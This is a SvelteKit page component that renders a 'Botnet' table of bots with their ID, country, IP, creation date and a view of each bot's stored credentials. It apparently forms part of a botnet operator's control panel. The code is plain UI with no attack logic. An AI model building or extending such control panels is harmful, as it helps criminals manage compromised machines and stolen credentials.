<script lang="ts">
	import type { PageData } from './$types';
	import { format } from 'date-fns';
	import {
		createSvelteTable,
		getCoreRowModel,
		flexRender,
		type ColumnDef,
		type TableOptions
	} from '@tanstack/svelte-table';
	import type { Bot } from './+page.server';
	import Country from '$lib/components/country.svelte';
	import View from '$lib/components/view.svelte';

	const defaultColumns: ColumnDef<Bot>[] = [
		{
			accessorKey: 'id',
			header: 'ID',
			cell: (info) => info.getValue()
		},
		{
			accessorKey: 'country_code',
			header: 'Country',
			cell: (info) => flexRender(Country, { country_code: info.getValue<string>() })
		},
		{
			accessorKey: 'ip',
			header: 'IP',
			cell: (info) => info.getValue()
		},
		{
			accessorKey: 'created',
			header: 'Created',
			cell: (info) => format(new Date(info.getValue<string>()), 'dd-MMM-yyyy HH:mm:SS')
		},
		{
			accessorKey: 'creds',
			header: 'View',
			cell: (info) => flexRender(View, { creds: info.getValue() })
		}
	];

	export let data: PageData;
	const options: TableOptions<Bot> = {
		data: data.bots,
		columns: defaultColumns,
		getCoreRowModel: getCoreRowModel()
	};

	const table = createSvelteTable(options);
</script>

<div class="primary-container">
	<h2 class="text-3xl font-bold py-6">Botnet</h2>

	<section>
		<div class="flex items-center">
			<input
				type="text"
				id="table-search"
				class="bg-neutral-800 text-white focus-visible:outline-none focus:ring ring-neutral-500 rounded px-2 py-1"
				placeholder="Search for items"
			/>
		</div>

		<table class="w-full bg-neutral-800 rounded mt-3 font-mono">
			<thead>
				{#each $table.getHeaderGroups() as headerGroup}
					<tr>
						{#each headerGroup.headers as header}
							<th class="uppercase font-normal text-sm text-left p-2">
								{#if !header.isPlaceholder}
									<svelte:component
										this={flexRender(header.column.columnDef.header, header.getContext())}
									/>
								{/if}
							</th>
						{/each}
					</tr>
				{/each}
			</thead>
			<tbody>
				{#each $table.getRowModel().rows as row}
					<tr>
						{#each row.getVisibleCells() as cell}
							<td class="p-2 text-base">
								<svelte:component
									this={flexRender(cell.column.columnDef.cell, cell.getContext())}
								/>
							</td>
						{/each}
					</tr>
				{/each}
			</tbody>
		</table>
	</section>
</div>
